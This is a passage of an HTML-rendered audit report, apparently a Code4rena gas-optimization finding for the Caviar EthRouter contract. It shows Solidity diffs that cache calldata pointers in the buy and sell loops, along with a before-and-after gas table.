{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            Buy calldata _buy = buys[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256[] calldata _tokenIds = _buy.tokenIds;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (_buy.isPublicPool) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // execute the buy against a public pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                uint256 inputAmount = Pair(buys[i].pool).nftBuy{value: buys[i].baseTokenAmount}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    buys[i].tokenIds, buys[i].baseTokenAmount, 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                uint256 inputAmount = Pair(_buy.pool).nftBuy{value: _buy.baseTokenAmount}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    _tokenIds, _buy.baseTokenAmount, 0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // pay the royalties if buyer has opted-in</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 if (payRoyalties) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    uint256 salePrice = inputAmount / buys[i].tokenIds.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    for (uint256 j = 0; j &lt; buys[i].tokenIds.length; j++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    uint256 salePrice = inputAmount / _tokenIds.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    for (uint256 j = 0; j &lt; _tokenIds.length; j++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                         // get the royalty fee and recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                         (uint256 royaltyFee, address royaltyRecipient) =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                            getRoyalty(buys[i].nft, buys[i].tokenIds[j], salePrice);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                            getRoyalty(_buy.nft, _tokenIds[j], salePrice);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                         if (royaltyFee &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                             // transfer the royalty fee to the royalty recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -126,14 +128,14 @@ contract EthRouter is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // execute the buy against a private pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                PrivatePool(buys[i].pool).buy{value: buys[i].baseTokenAmount}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    buys[i].tokenIds, buys[i].tokenWeights, buys[i].proof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                PrivatePool(_buy.pool).buy{value: _buy.baseTokenAmount}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    _tokenIds, _buy.tokenWeights, _buy.proof</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            for (uint256 j = 0; j &lt; buys[i].tokenIds.length; j++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            for (uint256 j = 0; j &lt; _tokenIds.length; j++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // transfer the NFT to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                ERC721(buys[i].nft).safeTransferFrom(address(this), msg.sender, buys[i].tokenIds[j]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                ERC721(_buy.nft).safeTransferFrom(address(this), msg.sender, _tokenIds[j]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L159-L200\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L159-L200</a></p>\n<h3 id=\"cache-calldata-pointers-for-sellsi-and-sellsitokenids\" style=\"position:relative;\"><a href=\"#cache-calldata-pointers-for-sellsi-and-sellsitokenids\" aria-label=\"cache calldata pointers for sellsi and sellsitokenids permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Cache calldata pointers for <code>sells[i]</code> and <code>sells[i].tokenIds</code></h3>\n<p><em>Gas Savings for <code>EthRouter.sell</code>, obtained via protocol’s tests: Avg 5422 gas</em></p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th>Med</th>\n<th>Max</th>\n<th>Avg</th>\n<th># calls</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Before</td>\n<td>217300</td>\n<td>402940</td>\n<td>232102</td>\n<td>7</td>\n</tr>\n<tr>\n<td>After</td>\n<td>212264</td>\n<td>392556</td>\n<td>226680</td>\n<td>7</td>\n</tr>\n</tbody>\n</table>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">EthRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">159</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">160</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// transfer the NFTs into the router from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">161</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">162</span><span class=\"mtk1\">:                </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">163</span><span class=\"mtk1\">:            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">164</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">165</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// approve the pair to transfer NFTs from the router</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">166</span><span class=\"mtk1\">:            </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">).</span><span class=\"mtk11\">setApprovalForAll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">, </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">167</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">168</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">isPublicPool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">169</span><span class=\"mtk1\">:                </span><span class=\"mtk3\">// exceute the sell against a public pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">170</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">Pair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">nftSell</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">171</span><span class=\"mtk1\">:                    </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">172</span><span class=\"mtk1\">:                    </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">173</span><span class=\"mtk1\">:                    </span><span class=\"mtk7\">0</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">174</span><span class=\"mtk1\">:                    </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">publicPoolProofs</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">175</span><span class=\"mtk1\">:                    </span><span class=\"mtk3\">// ReservoirOracle.Message[] is the exact same as IStolenNftOracle.Message[] and can be</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">176</span><span class=\"mtk1\">:                    </span><span class=\"mtk3\">// decoded/encoded 1-to-1.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">177</span><span class=\"mtk1\">:                    </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">decode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">stolenNftProofs</span><span class=\"mtk1\">), (</span><span class=\"mtk12\">ReservoirOracle</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Message</span><span class=\"mtk1\">[]))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">178</span><span class=\"mtk1\">:                );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">179</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">180</span><span class=\"mtk1\">:                </span><span class=\"mtk3\">// pay the royalties if seller has opted-in</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">181</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">payRoyalties</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">182</span><span class=\"mtk1\">:                    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">salePrice</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">outputAmount</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">183</span><span class=\"mtk1\">:                    </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">184</span><span class=\"mtk1\">:                        </span><span class=\"mtk3\">// get the royalty fee and recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">:                        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">royaltyRecipient</span><span class=\"mtk1\">) =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">186</span><span class=\"mtk1\">:                            </span><span class=\"mtk11\">getRoyalty</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">nft</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">j</span><span class=\"mtk1\">], </span><span class=\"mtk12\">salePrice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">187</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">188</span><span class=\"mtk1\">:                        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">189</span><span class=\"mtk1\">:                            </span><span class=\"mtk3\">// transfer the royalty fee to the royalty recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">190</span><span class=\"mtk1\">:                            </span><span class=\"mtk12\">royaltyRecipient</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">191</span><span class=\"mtk1\">:                        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">192</span><span class=\"mtk1\">:                    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">193</span><span class=\"mtk1\">:                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">194</span><span class=\"mtk1\">:            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">195</span><span class=\"mtk1\">:                </span><span class=\"mtk3\">// execute the sell against a private pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">196</span><span class=\"mtk1\">:                </span><span class=\"mtk11\">PrivatePool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk11\">sell</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">197</span><span class=\"mtk1\">:                    </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenIds</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenWeights</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">proof</span><span class=\"mtk1\">, </span><span class=\"mtk12\">sells</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk12\">stolenNftProofs</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">198</span><span class=\"mtk1\">:                );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">199</span><span class=\"mtk1\">:            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">200</span><span class=\"mtk1\">:        }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"77\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/EthRouter.sol b/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 125001d..12218d6 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/EthRouter.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -157,33 +157,35 @@ contract EthRouter is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         // loop through and execute the sells</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         for (uint256 i = 0; i &lt; sells.length; i++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            Sell calldata _sell = sells[i];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            uint256[] calldata _tokenIds = _sell.tokenIds;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // transfer the NFTs into the router from the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            for (uint256 j = 0; j &lt; sells[i].tokenIds.length; j++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                ERC721(sells[i].nft).safeTransferFrom(msg.sender, address(this), sells[i].tokenIds[j]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            for (uint256 j = 0; j &lt; _tokenIds.length; j++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                ERC721(_sell.nft).safeTransferFrom(msg.sender, address(this), _tokenIds[j]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             // approve the pair to transfer NFTs from the router</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            ERC721(sells[i].nft).setApprovalForAll(sells[i].pool, true);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            ERC721(_sell.nft).setApprovalForAll(_sell.pool, true);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-            if (sells[i].isPublicPool) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+            if (_sell.isPublicPool) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // exceute the sell against a public pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                uint256 outputAmount = Pair(sells[i].pool).nftSell(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    sells[i].tokenIds,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                uint256 outputAmount = Pair(_sell.pool).nftSell(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    _tokenIds,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     0,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     0,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    sells[i].publicPoolProofs,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    _sell.publicPoolProofs,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     // ReservoirOracle.Message[] is the exact same as IStolenNftOracle.Message[] and can be</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     // decoded/encoded 1-to-1.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    abi.decode(abi.encode(sells[i].stolenNftProofs), (ReservoirOracle.Message[]))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    abi.decode(abi.encode(_sell.stolenNftProofs), (ReservoirOracle.Message[]))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // pay the royalties if seller has opted-in</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 if (payRoyalties) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    uint256 salePrice = outputAmount / sells[i].tokenIds.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    for (uint256 j = 0; j &lt; sells[i].tokenIds.length; j++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    uint256 salePrice = outputAmount / _tokenIds.length;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    for (uint256 j = 0; j &lt; _tokenIds.length; j++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                         // get the royalty fee and recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                         (uint256 royaltyFee, address royaltyRecipient) =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                            getRoyalty(sells[i].nft, sells[i].tokenIds[j], salePrice);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                            getRoyalty(_sell.nft, _tokenIds[j], salePrice);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                         if (royaltyFee &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                             // transfer the royalty fee to the royalty recipient</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -193,8 +195,8 @@ contract EthRouter is ERC721TokenReceiver {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 // execute the sell against a private pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                PrivatePool(sells[i].pool).sell(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    sells[i].tokenIds, sells[i].tokenWeights, sells[i].proof, sells[i].stolenNftProofs</span></span></span>\n<span class=\"grvsc-line\"><span 